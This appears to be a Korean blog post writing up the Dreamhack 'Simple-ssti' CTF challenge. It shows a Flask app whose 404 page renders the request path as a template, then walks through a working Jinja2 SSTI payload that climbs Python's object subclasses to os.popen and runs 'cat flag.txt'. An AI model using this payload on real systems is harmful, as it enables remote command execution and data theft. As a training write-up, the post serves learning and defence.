---
layout: post
comments: true
sitemap:
    changefreq:
    priority:

title: "[CTF] Dreamhack 문제 풀이: Simple-ssti"
excerpt: "SSTI(Server-side Template Injection)"

date: 2026-02-05
last_modified_at: 2026-02-05

categories: [CTF]
tags: [TIL, WEB, CTF]
---

<!-- markdownlint-disable MD010 MD025 MD033 -->

# Simple-ssti

## 목차

1. [Vuln](#1-vuln)
2. [Code](#2-code)
3. [Payload](#3-payload)
    1. [전체 구조](#31-전체-구조)
    2. [객체 탈출(파이썬 리플렉션 체인)](#32-객체-탈출파이썬-리플렉션-체인)
    3. [특정 클래스 하나를 골라서 전역 네임스페이스로 접근](#33-특정-클래스-하나를-골라서-전역-네임스페이스로-접근)
    4. [os 모듈을 찾아 명령 실행](#34-os-모듈을-찾아-명령-실행)
    5. [실행 과정](#35-실행-과정)
4. [참고](#참고)

---

## 1. Vuln

SSTI(Server-side Template Injection): 공격자의 악의적인 코드가 웹 템플릿 엔진(Web Template Engine)에 들어가 서버측에서 템플릿 코드가 실행되는 취약점이다.

## 2. Code

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, render_template_string, make_response, redirect, url_for
import socket

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

app.secret_key = FLAG


# index 페이지
@app.route('/')
def index():
    return render_template('index.html')

# 404 에러 페이지
@app.errorhandler(404)
def Error404(e):
    template = '''
    <div class="center">
        <h1>Page Not Found.</h1>
        <h3>%s</h3>
    </div>
    ''' % (request.path)
    return render_template_string(template), 404

app.run(host='0.0.0.0', port=8000)
```

404 에러페이지에서 사용자로부터 입력받은 값을 검증 없이 문자열로 연결, 템플릿으로 조립하고 있다.
FLAG는 `./flag.txt`에서 읽어와 `app.secret_key`로 저장하고 있다.

## 3. Payload

{% raw %}
`{{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt').read()}}`
{% endraw %}

코드에 대해서 설명하자면

### 3.1. 전체 구조

{% raw %}
`{{ ... }}`: 템플릿 코드 Jinja로 감싼다.
{% endraw %}

### 3.2. 객체 탈출(파이썬 리플렉션 체인)

`"".__class__.__base__.__subclasses__()`

- `""`: 빈 문자열 객체(`str` 인스턴스)
- `.__class__`: 그 객체의 클래스 -> `str`
- `.__base__`: 그 클래스의 부모 클래스 -> `object`
- `.__subclasses__()`: `object`를 상속하는 모든 클래스 목록을 리스트로 반환한다.

> 리플렉션(Reflection): 런타임에서 프로그램의 구조를 파악하고 동적 객체 생성 및 함수 호출 등의 행위를 수행할 수 있게 해주는 장치이다.

### 3.3. 특정 클래스 하나를 골라서 전역 네임스페이스로 접근

`__subclasses__()[109].__init__.__globals__`

- `[109]` : subclasses 리스트에서 109번째 클래스를 고른다. (환경마다 인덱스는 달라진다)
- `.__init__` : 그 클래스의 생성자 함수
- `.__globals__` : 그 함수가 참조하는 전역 변수 딕셔너리(모듈 전역 스코프)

### 3.4. os 모듈을 찾아 명령 실행

`['sys'].modules['os'].popen('cat flag.txt').read()`

- `['sys']` : 전역에서 sys 객체를 꺼낸다.
- `sys.modules['os']` : 이미 로드된 os 모듈 객체 참조
- `os.popen('cat flag.txt')` : 쉘 명령 실행 파이프 연다.
- `.read()` : 실행 결과(표준출력)를 문자열로 읽는다.

### 3.5. 실행 과정

<details>
<summary> 토글 접기/펼치기</summary>
<div markdown="1">

`7*7`
![404x118](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-33-44.png)

`"".__class__`
![404x108](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-34-32.png)

`{{"".__class__.__base__}}`
![404x111](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-35-07.png)

`"".__class__.__base__.__subclasses__()`
![404x428](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-36-25.png)

`"".__class__.__base__.__subclasses__()[109].__init__`
![404x112](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-37-02.png)

`"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys']`
![404x109](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-37-46.png)

`"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os']`
![404x108](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-38-34.png)

`"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt')`
![404x107](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-39-19.png)

{% raw %}
`{{"".__class__.__base__.__subclasses__()[109].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt').read()}}`
{% endraw %}
![404x112](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-05-14-33-12.png)

</div>
</details>

---

## 참고

- [quantylab: 파이썬 리플렉션 (동적 클래스 인스턴스 생성 및 함수 호출)](https://blog.quantylab.com/python_reflection.html)
- [Python Docs: reflection](https://docs.python.org/ko/3/c-api/reflection.html)
- [WikiDocs: subprocess.Popen()](https://wikidocs.net/14350)
- [Github Pages: Server-Side Template Injection(SSTI)](https://core-research-team.github.io/2021-05-01/Server-Side-Template-Injection(SSTI))
